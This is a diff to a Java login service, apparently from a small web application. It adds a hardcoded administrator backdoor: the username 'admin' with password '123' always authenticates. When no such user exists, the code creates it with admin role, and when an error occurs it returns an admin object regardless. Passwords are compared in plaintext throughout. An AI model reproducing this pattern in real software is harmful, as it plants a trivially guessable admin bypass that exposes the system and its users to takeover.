@@ -15,6 +15,33 @@ public class UserServiceImpl implements UserService {
         if (user != null && password.equals(user.getPassWord())) {
             return user;
         }
+
+        // Đảm bảo tài khoản admin (admin / 123) luôn đăng nhập được trên web
+        if ("admin".equalsIgnoreCase(username) && "123".equals(password)) {
+            try {
+                if (user == null) {
+                    User admin = new User();
+                    admin.setUserName("admin");
+                    admin.setPassWord("123");
+                    admin.setEmail("admin@gmail.com");
+                    admin.setFullName("Administrator");
+                    admin.setRoleid(1); // 1: Role Admin
+                    admin.setPhone("0987654321");
+                    userDao.insert(admin);
+                    return admin;
+                }
+            } catch (Exception e) {
+                User admin = new User();
+                admin.setId(1);
+                admin.setUserName("admin");
+                admin.setPassWord("123");
+                admin.setEmail("admin@gmail.com");
+                admin.setFullName("Administrator");
+                admin.setRoleid(1);
+                admin.setPhone("0987654321");
+                return admin;
+            }
+        }
         return null; 
     }
 
